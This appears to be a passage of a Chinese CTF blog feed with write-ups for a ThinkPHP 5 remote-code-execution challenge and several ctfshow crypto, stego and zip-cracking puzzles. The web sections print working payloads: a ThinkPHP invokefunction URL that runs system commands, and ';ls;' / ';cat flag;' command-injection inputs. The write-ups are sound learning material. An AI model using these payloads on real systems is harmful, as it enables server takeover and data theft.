    <content type="html"><![CDATA[<p>第一次见thinkPHP，以前只有听过</p><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309160713.jpg" alt="QQ截图20200309160713"></p><a id="more"></a><p>刚看到还以为我容器坏了…其实并没有</p><p>题目是phprce，我们先来介绍一下rce(远程代码执行漏洞)，百度结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1. 什么是远程代码执行漏洞</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">远程命令&#x2F;代码执行漏洞，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。RCE分为远程命令执行ping和远程代码执行evel。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">2. 漏洞产生的根本原因</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">服务器没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</span></pre></td></tr></table></figure><p>页面也说明了是ThinkPHP V5版本  百度得知这个版本的确有远程代码执行漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31版本在没有开启强制路由的情况下可能存在远程代码执行漏洞。攻击者通过该漏洞可能完全控制Web服务器。</span></pre></td></tr></table></figure><p>直接上payload</p><p>查找flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:43736&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;find &#x2F; -name &quot;flag&quot;</span></pre></td></tr></table></figure><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309162510.jpg" alt="QQ截图20200309162510"></p><p>cat</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:43736&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;cat &#x2F;flag</span></pre></td></tr></table></figure><p><img src="/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309162435.jpg" alt="QQ截图20200309162435"></p><p>附上一些查找到的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">PHP代码执行函数：eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  PHP命令执行函数：system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次见thinkPHP，以前只有听过&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/QQ%E6%88%AA%E5%9B%BE20200309160713.jpg&quot; alt=&quot;QQ截图20200309160713&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
    
      <category term="攻防世界" scheme="http://lingxin16.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
      <category term="ThinkPHP" scheme="http://lingxin16.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-萌新赛</title>
    <link href="http://lingxin16.github.io/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/"/>
    <id>http://lingxin16.github.io/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/</id>
    <published>2020-03-08T05:16:08.000Z</published>
    <updated>2020-03-08T08:13:34.624Z</updated>
    
    <content type="html"><![CDATA[<h2 id="萌新赛web-签到题"><a href="#萌新赛web-签到题" class="headerlink" title="萌新赛web_签到题"></a>萌新赛web_签到题</h2><p>源码：</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308132725.jpg" alt="QQ截图20200308132725"></p><a id="more"></a><p>这道题的预期解是命令执行</p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?url&#x3D;;ls;</span></pre></td></tr></table></figure><p>发现flag index.php两个目录</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308133544.jpg" alt="QQ截图20200308133544"></p><p>再构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">?url&#x3D;;cat flag;</span></pre></td></tr></table></figure><p>得到flag</p><p>然后我做的时候是直接访问/flag 下载flag文件得到flag</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308133922.jpg" alt="QQ截图20200308133922"></p><p>不愧是我(萌新)</p><h2 id="萌新赛密码学-签到题"><a href="#萌新赛密码学-签到题" class="headerlink" title="萌新赛密码学_签到题"></a>萌新赛密码学_签到题</h2><p>Ao(mgHX^E)AN2PSBOu3qI0o</p><p>直接base85解码得到flag</p><h2 id="萌新赛密码学-抱我"><a href="#萌新赛密码学-抱我" class="headerlink" title="萌新赛密码学_抱我"></a>萌新赛密码学_抱我</h2><p>下载flag.py</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308134323.jpg" alt="QQ截图20200308134323"></p><p>完全不懂的py脚本，就交给呆头鹅林师傅了</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/1.jpg" alt="1"></p><p>最后林师傅解出来的随机数列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">d f l 3 3 &#123; 6 &#123; 6 g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">3 a f a 6 &#123; 3 &#125; a g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#123; &#125; a a g d f &#125; 6 f</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">3 6 d &#123; d f l &#123; 6 a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">6 g a f d d f g &#125; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">3 f &#125; &#125; 6 l a &#123; 3 &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">f d f 3 &#125; g l a &#125; 6</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125; l g 6 g 6 d f l f</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#123; d f g d 3 f d f g</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#123; g 6 a &#125; a 3 &#123; 6 &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">f a &#123; &#125; f &#125; f &#125; &#125; &#125;</span></pre></td></tr></table></figure><p>结合群主的爱好，盲猜flag{36d}！！！</p><h2 id="萌新赛杂项-qrcode"><a href="#萌新赛杂项-qrcode" class="headerlink" title="萌新赛杂项_qrcode"></a>萌新赛杂项_qrcode</h2><p>题目下载下来打开是一段二进制，结合题目qrcode应该是二进制和二维码之间的转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111</span></pre></td></tr></table></figure><p>直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">from PIL import Image</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">MAX &#x3D; 25</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">pic &#x3D; Image.new(&quot;RGB&quot;,(MAX, MAX))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">str &#x3D; &quot;得到的二进制数字&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">i&#x3D;0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">for y in range (0,MAX):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    for x in range (0,MAX):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        if(str[i] &#x3D;&#x3D; &#39;1&#39;):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">            pic.putpixel([x,y],(0, 0, 0))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        else:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            pic.putpixel([x,y],(255,255,255))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        i &#x3D; i+1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">pic.show()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">pic.save(&quot;flag.png&quot;)</span></pre></td></tr></table></figure><p>得到二维码，扫描得flag</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/flag.png" alt="flag"></p><h2 id="萌新赛杂项-签到"><a href="#萌新赛杂项-签到" class="headerlink" title="萌新赛杂项_签到"></a>萌新赛杂项_签到</h2><p>查看源代码</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155004.jpg" alt="QQ截图20200308155004"></p><p>发现第十行代码意外的长</p><p>把下面下载下来用notepad打开 查看第十行</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155220.jpg" alt="QQ截图20200308155220"></p><p>把tab替换成1，空格替换成0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="linespan></pre></td></tr></table></figure><p>转换字符串</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155637.jpg" alt="QQ截图20200308155637"></p><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-.... -.... -.... -.-. -.... .---- -.... --... --... -... ....- -.. -.... ..... -.... . -.... --... ....- -.. -.... ..... -.... . -.... --... ....- ....- -.... .---- --... -..</span></pre></td></tr></table></figure><p>摩斯解码处理</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308155735.jpg" alt="QQ截图20200308155735"></p><p>得到十六进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">666c61677b4d656e674d656e6744617d</span></pre></td></tr></table></figure><p>最后转换ASCII码得到flag{MengMengDa}</p><h2 id="萌新赛杂项-劝退警告"><a href="#萌新赛杂项-劝退警告" class="headerlink" title="萌新赛杂项_劝退警告"></a>萌新赛杂项_劝退警告</h2><p>下载下来是一张gif，直接改后缀.zip解压发现压缩包</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308135432.jpg" alt="QQ截图20200308135432"></p><p>压缩包中两个文件flag2.zip和sudoku.png</p><p>右边的注释说明密码需要我们解数独 但是sudoku.png也显示是加密的</p><p>这里我用Ziperello来爆破发现导入压缩包的时候显示只有一个文件是加密的</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308135730.jpg" alt="QQ截图20200308135730"></p><p>那么这个sudoku.png就可能是伪加密，通过修改二进制解压出sudoku.png</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/sudoku.png" alt="sudoku"></p><p>然后在线解数独，通过注释说明的方法得到flag2.zip的密码得到flag2.zip</p><p>结果flag2.zip还有密码，而且不是伪加密，只有注释:这道题很难，你现在离开还来得及。</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308140057.jpg" alt="QQ截图20200308140057"></p><p>我可能会离开吗！必不可能啊。通过与群里的几位师傅商量，我们最终觉得这应该是明文爆破，但是怎么构造明文可就难倒大家了。</p><p>也不难发现，这个说明.txt大小只有1kb 48字节，我们通过把注释写到txt中惊奇的发现也是48字节！！！（有的师傅是36字节，原因是txt的编码方式不同，更改编码方式就行）</p><p>直接开始爆破，在爆破的过程中一半我们不用等爆破完直接停止就能得到恢复后的文件</p><p>，但是这个不能立即停止…..足足爆破了两个小时也没停</p><p>最后发现是停止的时间问题（明文爆破分两个阶段，第一个阶段我们就能得到恢复后的文件，第二阶段是寻找密码的过程。我们只需要解压后的文件，不需要密码，所以在第一阶段结束后就可以停止了，时间长的话就没有办法立即停止了。。。orz）</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308140749.jpg" alt="QQ截图20200308140749"></p><p>得到的这个flag.zip就很好爆破了，这里我是根据注释，写出了字典爆破，大家也可以用掩码爆破，得到open your eye.jpg根据文件名，猜到用silenteye来提取隐藏信息</p><p>得到flag.txt</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308141027.jpg" alt="QQ截图20200308141027"></p><p>不难发现是16进制 直接扔到winhex</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308141229.jpg" alt="QQ截图20200308141229"></p><p>猜测是pyc文件   关于pyc文件是py文件运行时产生的，我们可以通过反编译得到py文件，反编译的话有在线反编译的</p><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">(lambda __print, __g, __y, __operator: [ [ [ [ [ [ (check(0), None)[1] for __g[&#39;check&#39;], check.__name__ in [</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> (</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  lambda x: (lambda __l: [ [ (lambda __sentinel, __after, __items: __y(lambda __this: lambda : (lambda __i: [ [ (lambda __sentinel, __after, __items: __y(lambda __this: lambda : (lambda __i: [ [ __this() for __l[&#39;n&#39;] in [__operator.iadd(__l[&#39;n&#39;], decode(arr[int(__l[&#39;i&#39;])] + decode(arr[11] + chr(61) * 2) * 2))] ][0] for __l[&#39;i&#39;] in [__i] ][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())([], lambda : [ __this() for __l[&#39;v&#39;] in [__operator.iadd(__l[&#39;v&#39;], chr(int(__l[&#39;n&#39;])))] ][0], iter(__l[&#39;c&#39;])) for __l[&#39;n&#39;] in [&#39;&#39;] ][0] for __l[&#39;c&#39;] in [__i] ][0] if __i is not __sentinel else __after())(next(__items, __sentinel)))())([], lambda : (lambda __after: (__print(__l[&#39;v&#39;]), __after())[1] if __l[&#39;x&#39;] &#x3D;&#x3D; 1 else __after())(lambda : None), iter(flag.split(decode(arr[10] + decode(arr[11] + chr(61) * 2) * 2))))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">   for __l[&#39;v&#39;] in [&#39;&#39;] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">   for __l[&#39;x&#39;] in [x] ][0])(&#123;&#125;), &#39;check&#39;)]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">          ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;decode&#39;], decode.__name__ in [(lambda s: (lambda __l: [ base64.b64decode(__l[&#39;s&#39;].encode()).decode() for __l[&#39;s&#39;] in [s] ][0])(&#123;&#125;), &#39;decode&#39;)] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;encode&#39;], encode.__name__ in [(lambda s: (lambda __l: [ base64.b64encode(__l[&#39;s&#39;].encode()).decode() for __l[&#39;s&#39;] in [s] ][0])(&#123;&#125;), &#39;encode&#39;)] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;flag&#39;] in [&#39;136-139-78-132-162-89-49-117-70-161-49-118-70-02-01-01-70-137-01-160&#39;] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;arr&#39;] in [[&#39;NQ&#39;, &#39;MQ&#39;, &#39;Mw&#39;, &#39;MA&#39;, &#39;NA&#39;, &#39;Ng&#39;, &#39;Mg&#39;, &#39;OQ&#39;, &#39;Nw&#39;, &#39;OA&#39;, &#39;LQ&#39;, &#39;PQ&#39;]] ][0]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"> for __g[&#39;base64&#39;] in [__import__(&#39;base64&#39;, __g, __g)] ][0])(__import__(&#39;__builtin__&#39;, level&#x3D;0).__dict__[&#39;print&#39;], globals(), lambda f: (lambda x: x(x))(lambda y: f(lambda : y(y)())), __import__(&#39;operator&#39;, level&#x3D;0))</span></pre></td></tr></table></figure><p>通过hint改check(0)为check(1)运行得到flag</p><h2 id="萌新赛杂项-萌新福利"><a href="#萌新赛杂项-萌新福利" class="headerlink" title="萌新赛杂项_萌新福利"></a>萌新赛杂项_萌新福利</h2><p>解压得到show.bin文件</p><p>根据提示求反</p><p><img src="/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308160159.jpg" alt="QQ截图20200308160159"></p><p>输出音频文件，得到flag(小姐姐声音真好听……)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;萌新赛web-签到题&quot;&gt;&lt;a href=&quot;#萌新赛web-签到题&quot; class=&quot;headerlink&quot; title=&quot;萌新赛web_签到题&quot;&gt;&lt;/a&gt;萌新赛web_签到题&lt;/h2&gt;&lt;p&gt;源码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/03/08/ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9B/QQ%E6%88%AA%E5%9B%BE20200308132725.jpg&quot; alt=&quot;QQ截图20200308132725&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctfshow" scheme="http://lingxin16.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>2020年新春战疫—网络安全公益赛-套娃</title>
    <link href="http://lingxin16.github.io/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/"/>
    <id>http://lingxin16.github.io/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/</id>
    <published>2020-03-03T08:25:29.000Z</published>
    <updated>2020-03-03T08:45:20.977Z</updated>
    
    <content type="html"><![CDATA[<p>1.zip 解压后得到下列文件</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556671-780069-image.png" alt="1582556671-780069-image"></p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">对Brainfuck在下面网站进行解密，得到 dcaf03aa88d038686c5e8067a7a45ff8</span></pre></td></tr></table></figure><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a><br>二进制编辑1.连环画.png 得到 part1:068c<br>使用上面的解密值，解压2.zip<br>2.zip 解压后得到下列文件</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556693-353542-image.png" alt="1582556693-353542-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">二进制编辑2.连环画.jpeg，得到 part2:555b</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582557252-699162-image.png" alt="1582556724-854471-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">爆破3.zip 得到压缩包密码 3302</span></pre></td></tr></table></figure><p>3.zip 解压后得到下列文件</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556724-854471-image.png" alt="1582556724-854471-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">修改伪加密位解压4.zip</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556739-668302-image.png" alt="1582556739-668302-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">LSB隐写查看得到part3:578b</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556752-15476-image.png" alt="1582556752-15476-image"></p><p>4.zip 解压后得到文件</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556764-249372-image.png" alt="1582556764-249372-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">根据提示使用明文攻击，解压5.zip</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556774-688544-image.png" alt="1582556774-688544-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">这里可以不用等全部结束，点击停止，可释放已解密部分文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"> </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">爆破4.png的高度，可获得part4:0eae</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582557176-568780-image.png" alt="1582557176-568780-image"></p><p>5.zip解压后获得下面文件：</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556800-808334-image.png" alt="1582556800-808334-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">使用猪圈密码得到压缩包密码：fojiajielv</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">对5.连环画进行拼接得到part5:9d4b</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582557291-574981-image.png" alt="1582557291-574981-image"></p><p>6.zip解压后得到下面文件</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556819-887870-image.png" alt="1582556819-887870-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">使用佛经解密得到压缩包密码</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582557311-560572-image.png" alt="1582557311-560572-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">对6.jpg进行binwalk，可以看到莫斯密码，对莫斯密码进行解密得到part6:e52bd67</span></pre></td></tr></table></figure><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582557327-475780-image.png" alt="1582557327-475780-image"></p><p>7.zip解压后得到文件如下：</p><p><img src="/2020/03/03/2020%E5%B9%B4%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-%E5%A5%97%E5%A8%83/1582556862-403350-image.png" alt="1582556920-783498-image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span 